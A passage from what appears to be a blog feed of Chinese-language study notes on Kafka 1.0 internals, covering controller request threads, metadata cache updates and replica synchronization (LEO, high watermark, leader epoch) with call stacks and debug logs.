n</td><td>499</td></tr><tr><td>kafka/controller/KafkaController</td><td>onNewTopicCreation</td><td>485</td></tr><tr><td>kafka/controller/KafkaController$TopicChange</td><td>process</td><td>1237</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1</td><td>apply$mcV$sp</td><td>53</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1</td><td>apply</td><td>53</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1</td><td>apply</td><td>53</td></tr><tr><td>kafka/metrics/KafkaTimer</td><td>time</td><td>32</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread</td><td>doWork</td><td>64</td></tr><tr><td>kafka/utils/ShutdownableThread</td><td>run</td><td>70</td></tr></table><p>发送线程发送请求：<br>代码如下： </p><pre><code class="hljs scala"><span class="hljs-comment">// ControllerChannelManager.scala class RequestSendThread</span>  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doWork</span></span>(): <span class="hljs-type">Unit</span> = &#123;    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backoff</span></span>(): <span class="hljs-type">Unit</span> = <span class="hljs-type">CoreUtils</span>.swallowTrace(<span class="hljs-type">Thread</span>.sleep(<span class="hljs-number">100</span>))    <span class="hljs-keyword">val</span> <span class="hljs-type">QueueItem</span>(apiKey, requestBuilder, callback) = queue.take()    <span class="hljs-comment">//...</span>    <span class="hljs-keyword">while</span> (isRunning.get() &amp;&amp; !isSendSuccessful) &#123;        <span class="hljs-comment">// if a broker goes down for a long time, then at some point the controller's zookeeper listener will trigger a</span>        <span class="hljs-comment">// removeBroker which will invoke shutdown() on this thread. At that point, we will stop retrying.</span>        <span class="hljs-keyword">try</span> &#123;          <span class="hljs-keyword">if</span> (!brokerReady()) &#123;            isSendSuccessful = <span class="hljs-literal">false</span>            backoff()          &#125;          <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">val</span> clientRequest = networkClient.newClientRequest(brokerNode.idString, requestBuilder,              time.milliseconds(), <span class="hljs-literal">true</span>)            clientResponse = <span class="hljs-type">NetworkClientUtils</span>.sendAndReceive(networkClient, clientRequest, time)            isSendSuccessful = <span class="hljs-literal">true</span>          &#125;        &#125; <span class="hljs-keyword">catch</span> &#123;          <span class="hljs-keyword">case</span> e: <span class="hljs-type">Throwable</span> =&gt; <span class="hljs-comment">// if the send was not successful, reconnect to broker and resend the message</span>            warn((<span class="hljs-string">"Controller %d epoch %d fails to send request %s to broker %s. "</span> +              <span class="hljs-string">"Reconnecting to broker."</span>).format(controllerId, controllerContext.epoch,                requestBuilder.toString, brokerNode.toString), e)            networkClient.close(brokerNode.idString)            isSendSuccessful = <span class="hljs-literal">false</span>            backoff()        &#125;      &#125;      <span class="hljs-comment">// ......</span>  &#125;</code></pre><h3 id="响应线程"><a href="#响应线程" class="headerlink" title="响应线程"></a>响应线程</h3><table><tr><td>CLASS_NAME</td><td>METHOD_NAME</td><td>LINE_NUM</td></tr><tr><td>kafka/server/MetadataCache</td><td>kafka$server$MetadataCache$$addOrUpdatePartitionInfo</td><td>150</td></tr><tr><td>kafka/utils/CoreUtils$</td><td>inLock</td><td>219</td></tr><tr><td>kafka/utils/CoreUtils$</td><td>inWriteLock</td><td>225</td></tr><tr><td>kafka/server/MetadataCache</td><td>updateCache</td><td>184</td></tr><tr><td>kafka/server/ReplicaManager</td><td>maybeUpdateMetadataCache</td><td>988</td></tr><tr><td>kafka/server/KafkaApis</td><td>handleUpdateMetadataRequest</td><td>212</td></tr><tr><td>kafka/server/KafkaApis</td><td>handle</td><td>142</td></tr><tr><td>kafka/server/KafkaRequestHandler</td><td>run</td><td>72</td></tr></table><p>线程信息：  kafka-request-handler-5<br>靠 <code>partitionMetadataLock</code>读写锁控制cache数据的读取与写入的线程安全。元数据信息在发送请求中已经构造好了。此处还涉live broker的更新等。    </p><p>应该还要补充：leader切换和isr变化等</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>副本同步</title>
    <link href="/2020/04/22/kafka1-0-replica-sync/"/>
    <url>/2020/04/22/kafka1-0-replica-sync/</url>
    
    <content type="html"><![CDATA[<h2 id="几个概念的解释"><a href="#几个概念的解释" class="headerlink" title="几个概念的解释"></a>几个概念的解释</h2><ul><li>LEO 日志的结尾位置，也是最后写入(append)消息的位置+1。这个位置不代表消费者能看到，仅仅表示单机的日志写入位置，因为要考虑其他副本的写入情况。leader与follower都有此指标。</li><li>HW high water mark的简称，对外公开的消费者的非事务消息(即未提交读模式)的位置。这个值的更新过程比较复杂。leader与follower都有此指标。与LEO的区别<a href="https://stackoverflow.com/questions/39203215/kafka-difference-between-log-end-offsetleo-vs-high-watermarkhw" target="_blank" rel="noopener">参见这里</a>  </li><li>LSO 事务消息涉及。最后稳定offset。如果是事务消息(即已提交读模式)，这是消费者能看到的最大位置。可以参见《offset range查询》中 <code>查询最新offset</code> 段落。</li><li>epoch leader的年代。0.11版本引入这个概念，为了解决0，8版本在broker挂掉的过程中消息可能丢失和错乱的问题。具体可以参见huxi的<a href="https://www.cnblogs.com/huxi2b/p/7453543.html" target="_blank" rel="noopener">Kafka水位(high watermark)与leader epoch的讨论</a>  </li></ul><blockquote><p>The high watermark indicated the offset of messages that are fully replicated, while the end-of-log offset might be larger if there are newly appended records to the leader partition which are not replicated yet.</p></blockquote><h2 id="副本同步主要结构"><a href="#副本同步主要结构" class="headerlink" title="副本同步主要结构"></a>副本同步主要结构</h2><p>主要涉及的类有：<code>AbstractFetcherThread</code>,<code>ReplicaFetcherThread</code>,<code>PartitionFetchState</code>,<code>ReplicaFetcherManager</code>,<code>ShutdownableThread</code>,<code>ReplicaManager</code> , <code>ReplicaFetcherManager</code> </p><h2 id="Follower机器逻辑简述"><a href="#Follower机器逻辑简述" class="headerlink" title="Follower机器逻辑简述"></a>Follower机器逻辑简述</h2><h3 id="线程创建部分"><a href="#线程创建部分" class="headerlink" title="线程创建部分"></a>线程创建部分</h3><ol><li>handleLeaderAndIsrRequest是入口，在handleLeaderAndIsrRequest时会触发<code>ReplicaManager</code>的<code>becomeLeaderOrFollower</code>,<code>makeFollowers</code></li><li>触发<code>ReplicaFetcherManager</code>的<code>addFetcherForPartitions</code></li><li>用<code>ReplicaFetcherManager</code>的<code>createFetcherThread</code>方法创建fetcher线程。new ReplicaFetcherThread….    </li></ol><p>一些字段的赋值说明：  </p><ul><li>线程名 s”${prefix}ReplicaFetcherThread-$fetcherId-${sourceBroker.id}”  </li><li>clientId 就是线程名</li><li>isInterruptible 创建时用固定值是false</li><li>includeLogTruncation 创建时用固定值是true，<strong>这也就是意味着PartitionFetchState对象一开始建出来时truncatingLog字段是true</strong>  </li></ul><h3 id="Follower机器逻辑执行部分"><a href="#Follower机器逻辑执行部分" class="headerlink" title="Follower机器逻辑执行部分"></a>Follower机器逻辑执行部分</h3><p>ReplicaFetcherThread类的结构继承关系是：<br>ShutdownableThread<br>|– AbstractFetcherThread<br>|—|– ReplicaFetcherThread  </p><p>因为<code>ShutdownableThread</code>是个spin线程，子类实现doWork方法即可对接业务逻辑。<br><code>AbstractFetcherThread</code>中的doWork逻辑组织：  </p><ul><li>maybeTruncate 处理可能需要截断的日志，针对LEO大于HW(highwater mark的简称，下同)的，要截断到HW位置。  </li><li>构建<code>FetchRequest</code>请求拉数据。</li><li>处理<code>FetchRequest</code>请求的响应，<code>processFetchRequest</code>。注意：该请求不一定能请求到消息数据(Record)，而且该请求也不是仅仅请求消息，还请求leader的高水位等值。 </li></ul><p>maybeTruncate逻辑：  </p><ul><li>过滤出<code>PartitionFetchState</code>实例<code>isTruncatingLog</code>为true的分区。PartitionFetchState的truncatingLog字段什么时候为true，目前分析是ReplicaFetcherThread线程刚创建时，默认赋值了true，也就是一开始可能会截断。  ReplicaFetcherThread.buildLeaderEpochRequest。  </li><li>根据上步过滤出来的结果，构建根据epoch查询offset的请求<code>OffsetsForLeaderEpochRequest</code>。ReplicaFetcherThread.fetchEpochsFromLeader。 </li><li>根据查询回来的结果，设置(纠正)正确的offset。我理解成只要mark了正确的位置即可，后面写的时候覆盖写即可，不要真正删除。(待证实)  AbstractFetcherThread.markTruncationComplete 。  </li></ul><p>处理<code>FetchRequest</code>请求的响应的逻辑：  </p><ul><li>根据结果判断有误错误码</li><li>结果正常的 调用<code>processPartitionData</code>，并更新分区状态   partitionStates.updateAndMoveToEnd(topicPartition, new PartitionFetchState(newOffset))  <code>ReplicaFetcherThread.processPartitionData</code></li><li><code>processPartitionData</code>由<code>ReplicaFetcherThread</code>实现，主要逻辑有:   <ul><li>写副本日志 replica.log.get.appendAsFollower(records)</li><li>更新副本的HW。 highWatermark 可以理解成 大家都已经确认的offset，否则就没必要维护这个了，直接用LEO或者LSO好  与LEO的区别<a href="https://stackoverflow.com/questions/39203215/kafka-difference-between-log-end-offsetleo-vs-high-watermarkhw" target="_blank" rel="noopener">参见这里</a>. 要构建用例恰好在这行前挂掉follower。</li><li>维护到副本对象的元数据中。 一次fetch请求并不能更新副本的highWatermark，需要下一次fethc请求才能完成上一次的。replica.highWatermark = new LogOffsetMetadata(followerHighWatermark)    </li></ul></li></ul><h2 id="leader与follower的HW-LEO更新过程"><a href="#leader与follower的HW-LEO更新过程" class="headerlink" title="leader与follower的HW LEO更新过程"></a>leader与follower的HW LEO更新过程</h2><h3 id="Leader机器逻辑执行部分"><a href="#Leader机器逻辑执行部分" class="headerlink" title="Leader机器逻辑执行部分"></a>Leader机器逻辑执行部分</h3><p>处理fetch请求的调用栈，消费者客户端与follower同步的fetch请求走的是一个逻辑，靠是否是来自follower做了些逻辑上的差异处理  </p><pre><code class="hljs java">ReplicaManager.kafka$server$ReplicaManager$$read$<span class="hljs-number">1</span>(TopicPartition, FetchRequest$PartitionData, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, ReplicaQuota, IsolationLevel) line: <span class="hljs-number">856</span>ReplicaManager$$anonfun$readFromLocalLog$<span class="hljs-number">1</span>.apply(Tuple2&lt;TopicPartition,PartitionData&gt;) line: <span class="hljs-number">962</span>ReplicaManager$$anonfun$readFromLocalLog$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">961</span>ResizableArray$class.foreach(ResizableArray, Function1) line: 59ArrayBuffer&lt;A&gt;.foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">48</span>ReplicaManager.readFromLocalLog(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq&lt;Tuple2&lt;TopicPartition,PartitionData&gt;&gt;, ReplicaQuota, IsolationLevel) line: <span class="hljs-number">961</span>ReplicaManager.readFromLog$<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq, ReplicaQuota, IsolationLevel, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">790</span>ReplicaManager.fetchMessages(<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq&lt;Tuple2&lt;TopicPartition,PartitionData&gt;&gt;, ReplicaQuota, Function1&lt;Seq&lt;Tuple2&lt;TopicPartition,FetchPartitionData&gt;&gt;,BoxedUnit&gt;, IsolationLevel) line: <span class="hljs-number">803</span>KafkaApis.handleFetchRequest(RequestChannel$Request) line: <span class="hljs-number">597</span>KafkaApis.handle(RequestChannel$Request) line: <span class="hljs-number">101</span></code></pre><p>涉及到的位点信息及更新逻辑：<br>fetchOffset  fetch开始位点，来自于fetch请求体<br>highWatermark 更新逻辑 </p><p>kafka.server.ReplicaManager.readFromLocalLog(…).read(…) 操作逻辑：<br>标志度量数据<br>获取副本对象localReplica 获取逻辑是根据replica id(即broker id)获取，发fetch请求的时候 请求体中会带上replica id<br>val initialHighWatermark = localReplica.highWatermark.messageOffset  </p><p><span style="font-weight:bold;color:red;">更新leader节点上维护远端副本的LEO信息</span><br>有点绕  就是<span style="font-weight:bold;color:red;">在leader节点上也 维护了 远端LEO的信息</span>  ，因为<span style="font-weight:bold;color:red;">leader节点高水位要靠远端的LEO来更新，leader节点高水位的更新逻辑就是 所有远端副本的LEO的最小值</span><br>调用栈如下：  </p><pre><code class="hljs java">Replica.logEndOffset_$eq(LogOffsetMetadata) line: <span class="hljs-number">98</span>Replica.updateLogReadResult(LogReadResult) line: <span class="hljs-number">83</span>Partition.updateReplicaLogReadResult(Replica, LogReadResult) line: <span class="hljs-number">276</span>ReplicaManager$$anonfun$updateFollowerLogReadResults$<span class="hljs-number">2</span>.apply(Tuple2&lt;TopicPartition,LogReadResult&gt;) line: <span class="hljs-number">1314</span>ReplicaManager$$anonfun$updateFollowerLogReadResults$<span class="hljs-number">2</span>.apply(Object) line: <span class="hljs-number">1308</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(A) line: <span class="hljs-number">234</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">234</span>ResizableArray$class.foreach(ResizableArray, Function1) line: 59ArrayBuffer&lt;A&gt;.foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">48</span>TraversableLike$class.map(TraversableLike, Function1, CanBuildFrom) line: 234ArrayBuffer&lt;A&gt;(AbstractTraversable&lt;A&gt;).map(Function1&lt;A,B&gt;, CanBuildFrom&lt;Traversable&lt;A&gt;,B,That&gt;) line: <span class="hljs-number">104</span>ReplicaManager.updateFollowerLogReadResults(<span class="hljs-keyword">int</span>, Seq&lt;Tuple2&lt;TopicPartition,LogReadResult&gt;&gt;) line: <span class="hljs-number">1308</span>ReplicaManager.readFromLog$<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq, ReplicaQuota, IsolationLevel, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">799</span>ReplicaManager.fetchMessages(<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq&lt;Tuple2&lt;TopicPartition,PartitionData&gt;&gt;, ReplicaQuota, Function1&lt;Seq&lt;Tuple2&lt;TopicPartition,FetchPartitionData&gt;&gt;,BoxedUnit&gt;, IsolationLevel) line: <span class="hljs-number">803</span>KafkaApis.handleFetchRequest(RequestChannel$Request) line: <span class="hljs-number">597</span></code></pre><p>可以看出来是在leader处理fetch请求的时候做的逻辑，fetch请求带上来fetch offset就当成了远端副本的LEO  </p><p><strong>TODO</strong> </p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ol><li>创建同步fetch线程<br>ReplicaFetcherManager.createFetcherThread(int, BrokerEndPoint) line: 30<br>ReplicaFetcherManager(AbstractFetcherManager).kafka$server$AbstractFetcherManager$$addAndStartFetcherThread$1(BrokerAndFetcherId, BrokerIdAndFetcherId) line: 80<br>AbstractFetcherManager$$anonfun$addFetcherForPartitions$2.apply(Tuple2&lt;BrokerAndFetcherId,Map&lt;TopicPartition,BrokerAndInitialOffset&gt;&gt;) line: 94<br>AbstractFetcherManager$$anonfun$addFetcherForPartitions$2.apply(Object) line: 85<br>TraversableLike$WithFilter$$anonfun$foreach$1.apply(A) line: 733<br>Map$Map1&lt;A,B&gt;.foreach(Function1&lt;Tuple2&lt;A,B&gt;,U&gt;) line: 116<br>TraversableLike$WithFilter.foreach(Function1&lt;A,U&gt;) line: 732<br>ReplicaFetcherManager(AbstractFetcherManager).addFetcherForPartitions(Map&lt;TopicPartition,BrokerAndInitialOffset&gt;) line: 85<br>ReplicaManager.makeFollowers(int, int, Map&lt;Partition,PartitionState&gt;, int, Map&lt;TopicPartition,Errors&gt;) line: 1272<br>ReplicaManager.becomeLeaderOrFollower(int, LeaderAndIsrRequest, Function2&lt;Iterable<Partition>,Iterable<Partition>,BoxedUnit&gt;) line: 1065<br>KafkaApis.handleLeaderAndIsrRequest(RequestChannel$Request) line: 173<br>KafkaApis.handle(RequestChannel$Request) line: 103<br>KafkaRequestHandler.run() line: 65<br>KafkaThread(Thread).run() line: 748    </li></ol><ol start="2"><li>构建请求<br>ReplicaFetcherThread.buildFetchRequest(Seq&lt;Tuple2&lt;TopicPartition,PartitionFetchState&gt;&gt;) line: 234<br>AbstractFetcherThread$$anonfun$2.apply() line: 104<br>AbstractFetcherThread$$anonfun$2.apply() line: 103<br>CoreUtils$.inLock(Lock, Function0<T>) line: 217<br>ReplicaFetcherThread(AbstractFetcherThread).doWork() line: 103<br>ReplicaFetcherThread(ShutdownableThread).run() line: 64      </li></ol><hr><hr><hr><p>看的过程中的临时记录：  </p><pre><code class="hljs java">[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">18</span>:<span class="hljs-number">07</span>:<span class="hljs-number">13</span>,<span class="hljs-number">787</span>] INFO Handling request:RequestHeader(apiKey=OFFSET_FOR_LEADER_EPOCH, apiVersion=<span class="hljs-number">0</span>, clientId=broker-<span class="hljs-number">0</span>-fetcher-<span class="hljs-number">0</span>, correlationId=<span class="hljs-number">0</span>) -- &#123;topics=[&#123;topic=test.vv19,partitions=[&#123;partition=<span class="hljs-number">0</span>,leader_epoch=<span class="hljs-number">25</span>&#125;]&#125;]&#125; from connection <span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">49385</span>-<span class="hljs-number">0</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">13</span>:<span class="hljs-number">02</span>,<span class="hljs-number">501</span>] INFO testEnter0002-<span class="hljs-number">001</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">37</span>]lso.messageOffset: [<span class="hljs-number">37</span>] (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">13</span>:<span class="hljs-number">02</span>,<span class="hljs-number">502</span>] INFO testEnter0002-<span class="hljs-number">002</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">37</span>]lso.messageOffset: [<span class="hljs-number">37</span>] (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">13</span>:<span class="hljs-number">03</span>,<span class="hljs-number">006</span>] INFO testEnter0005-Received response:apikey:FETCH correlationId <span class="hljs-number">24</span>; (com.code260.ss.KafkaTestUtils$)LeaderEpochFileCache$$anonfun$assign$<span class="hljs-number">1</span>.apply$mcV$sp() line: <span class="hljs-number">62</span>LeaderEpochFileCache$$anonfun$assign$<span class="hljs-number">1</span>.apply() line: <span class="hljs-number">61</span>LeaderEpochFileCache$$anonfun$assign$<span class="hljs-number">1</span>.apply() line: <span class="hljs-number">61</span>CoreUtils$.inLock(Lock, Function0&lt;T&gt;) line: <span class="hljs-number">217</span>CoreUtils$.inWriteLock(ReadWriteLock, Function0&lt;T&gt;) line: <span class="hljs-number">225</span>LeaderEpochFileCache.assign(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">long</span>) line: <span class="hljs-number">60</span>Log$$anonfun$append$<span class="hljs-number">2</span>$$anonfun$apply$<span class="hljs-number">9</span>.apply(MutableRecordBatch) line: <span class="hljs-number">689</span>Log$$anonfun$append$<span class="hljs-number">2</span>$$anonfun$apply$<span class="hljs-number">9</span>.apply(Object) line: <span class="hljs-number">687</span>Iterator$class.foreach(Iterator, Function1) line: 891Wrappers$JIteratorWrapper&lt;A&gt;(AbstractIterator&lt;A&gt;).foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">1334</span>IterableLike$class.foreach(IterableLike, Function1) line: 72Wrappers$JIterableWrapper&lt;A&gt;(AbstractIterable&lt;A&gt;).foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">54</span>Log$$anonfun$append$<span class="hljs-number">2</span>.apply() line: <span class="hljs-number">687</span>Log$$anonfun$append$<span class="hljs-number">2</span>.apply() line: <span class="hljs-number">624</span>Log.maybeHandleIOException(Function0&lt;String&gt;, Function0&lt;T&gt;) line: <span class="hljs-number">1669</span>Log.append(MemoryRecords, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">624</span>Log.appendAsLeader(MemoryRecords, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">597</span>Partition$$anonfun$<span class="hljs-number">13</span>.apply() line: <span class="hljs-number">500</span>Partition$$anonfun$<span class="hljs-number">13</span>.apply() line: <span class="hljs-number">488</span>CoreUtils$.inLock(Lock, Function0&lt;T&gt;) line: <span class="hljs-number">217</span>CoreUtils$.inReadLock(ReadWriteLock, Function0&lt;T&gt;) line: <span class="hljs-number">223</span>Partition.appendRecordsToLeader(MemoryRecords, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">487</span>ReplicaManager$$anonfun$appendToLocalLog$<span class="hljs-number">2</span>.apply(Tuple2&lt;TopicPartition,MemoryRecords&gt;) line: <span class="hljs-number">724</span>ReplicaManager$$anonfun$appendToLocalLog$<span class="hljs-number">2</span>.apply(Object) line: <span class="hljs-number">708</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(A) line: <span class="hljs-number">234</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">234</span>HashMap$$anonfun$foreach$<span class="hljs-number">1</span>.apply(DefaultEntry&lt;A,B&gt;) line: <span class="hljs-number">130</span>HashMap$$anonfun$foreach$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">130</span>HashTable$class.foreachEntry(HashTable, Function1) line: 236HashMap&lt;A,B&gt;.foreachEntry(Function1&lt;DefaultEntry&lt;A,B&gt;,U&gt;) line: <span class="hljs-number">40</span>HashMap&lt;A,B&gt;.foreach(Function1&lt;Tuple2&lt;A,B&gt;,U&gt;) line: <span class="hljs-number">130</span>TraversableLike$class.map(TraversableLike, Function1, CanBuildFrom) line: 234HashMap&lt;A,B&gt;(AbstractTraversable&lt;A&gt;).map(Function1&lt;A,B&gt;, CanBuildFrom&lt;Traversable&lt;A&gt;,B,That&gt;) line: <span class="hljs-number">104</span>ReplicaManager.appendToLocalLog(<span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, Map&lt;TopicPartition,MemoryRecords&gt;, <span class="hljs-keyword">short</span>) line: <span class="hljs-number">708</span>ReplicaManager.appendRecords(<span class="hljs-keyword">long</span>, <span class="hljs-keyword">short</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, Map&lt;TopicPartition,MemoryRecords&gt;, Function1&lt;Map&lt;TopicPartition,PartitionResponse&gt;,BoxedUnit&gt;, Option&lt;Lock&gt;, Function1&lt;Map&lt;TopicPartition,RecordsProcessingStats&gt;,BoxedUnit&gt;) line: <span class="hljs-number">458</span>KafkaApis.handleProduceRequest(RequestChannel$Request) line: <span class="hljs-number">460</span>KafkaApis.handle(RequestChannel$Request) line: <span class="hljs-number">100</span>KafkaRequestHandler.run() line: <span class="hljs-number">65</span>KafkaThread(Thread).run() line: <span class="hljs-number">748</span>LeaderEpochFileCache$$anonfun$assign$<span class="hljs-number">1</span>.apply$mcV$sp() line: <span class="hljs-number">62</span>LeaderEpochFileCache$$anonfun$assign$<span class="hljs-number">1</span>.apply() line: <span class="hljs-number">61</span>LeaderEpochFileCache$$anonfun$assign$<span class="hljs-number">1</span>.apply() line: <span class="hljs-number">61</span>CoreUtils$.inLock(Lock, Function0&lt;T&gt;) line: <span class="hljs-number">217</span>CoreUtils$.inWriteLock(ReadWriteLock, Function0&lt;T&gt;) line: <span class="hljs-number">225</span>LeaderEpochFileCache.assign(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">long</span>) line: <span class="hljs-number">60</span>Log$$anonfun$append$<span class="hljs-number">2</span>$$anonfun$apply$<span class="hljs-number">9</span>.apply(MutableRecordBatch) line: <span class="hljs-number">689</span>Log$$anonfun$append$<span class="hljs-number">2</span>$$anonfun$apply$<span class="hljs-number">9</span>.apply(Object) line: <span class="hljs-number">687</span>Iterator$class.foreach(Iterator, Function1) line: 891Wrappers$JIteratorWrapper&lt;A&gt;(AbstractIterator&lt;A&gt;).foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">1334</span>IterableLike$class.foreach(IterableLike, Function1) line: 72Wrappers$JIterableWrapper&lt;A&gt;(AbstractIterable&lt;A&gt;).foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">54</span>Log$$anonfun$append$<span class="hljs-number">2</span>.apply() line: <span class="hljs-number">687</span>Log$$anonfun$append$<span class="hljs-number">2</span>.apply() line: <span class="hljs-number">624</span>Log.maybeHandleIOException(Function0&lt;String&gt;, Function0&lt;T&gt;) line: <span class="hljs-number">1669</span>Log.append(MemoryRecords, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">624</span>Log.appendAsFollower(MemoryRecords) line: <span class="hljs-number">607</span>ReplicaFetcherThread.processPartitionData(TopicPartition, <span class="hljs-keyword">long</span>, ReplicaFetcherThread$PartitionData) line: <span class="hljs-number">123</span>ReplicaFetcherThread.processPartitionData(TopicPartition, <span class="hljs-keyword">long</span>, AbstractFetcherThread$PartitionData) line: <span class="hljs-number">62</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>$$anonfun$apply$mcV$sp$<span class="hljs-number">1</span>$$anonfun$apply$<span class="hljs-number">2</span>.apply(PartitionFetchState) line: <span class="hljs-number">184</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>$$anonfun$apply$mcV$sp$<span class="hljs-number">1</span>$$anonfun$apply$<span class="hljs-number">2</span>.apply(Object) line: <span class="hljs-number">172</span>Some&lt;A&gt;(Option&lt;A&gt;).foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">257</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>$$anonfun$apply$mcV$sp$<span class="hljs-number">1</span>.apply(Tuple2&lt;TopicPartition,PartitionData&gt;) line: <span class="hljs-number">172</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>$$anonfun$apply$mcV$sp$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">169</span>ResizableArray$class.foreach(ResizableArray, Function1) line: 59ArrayBuffer&lt;A&gt;.foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">48</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>.apply$mcV$sp() line: <span class="hljs-number">169</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>.apply() line: <span class="hljs-number">169</span>AbstractFetcherThread$$anonfun$processFetchRequest$<span class="hljs-number">2</span>.apply() line: <span class="hljs-number">169</span>CoreUtils$.inLock(Lock, Function0&lt;T&gt;) line: <span class="hljs-number">217</span>ReplicaFetcherThread(AbstractFetcherThread).processFetchRequest(AbstractFetcherThread$FetchRequest) line: <span class="hljs-number">167</span>ReplicaFetcherThread(AbstractFetcherThread).doWork() line: <span class="hljs-number">113</span>ReplicaFetcherThread(ShutdownableThread).run() line: <span class="hljs-number">64</span>ReplicaFetcherThread.fetchEpochsFromLeader(Map&lt;TopicPartition,Object&gt;) line: <span class="hljs-number">332</span>ReplicaFetcherThread(AbstractFetcherThread).maybeTruncate() line: <span class="hljs-number">130</span>ReplicaFetcherThread(AbstractFetcherThread).doWork() line: <span class="hljs-number">102</span>ReplicaFetcherThread(ShutdownableThread).run() line: <span class="hljs-number">64</span>   kafka.server.ReplicaManager.lastOffsetForLeaderEpoch    kafka.server.ReplicaFetcherThread.maybeTruncate(fetchedEpochs: Map[TopicPartition, EpochEndOffset])    kafka.server.ReplicaFetcherThread.handleOffsetOutOfRange(topicPartition: TopicPartition)    kafka.server.ReplicaFetcherThread.maybeTruncate(fetchedEpochs: Map[TopicPartition, EpochEndOffset])</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kafka-clients 1.0 高阶API消费消息(未完)</title>
    <link href="/2020/04/22/kafka1-0-clietns-consmer-high-level/"/>
    <url>/2020/04/22/kafka1-0-clietns-consmer-high-level/</url>
    
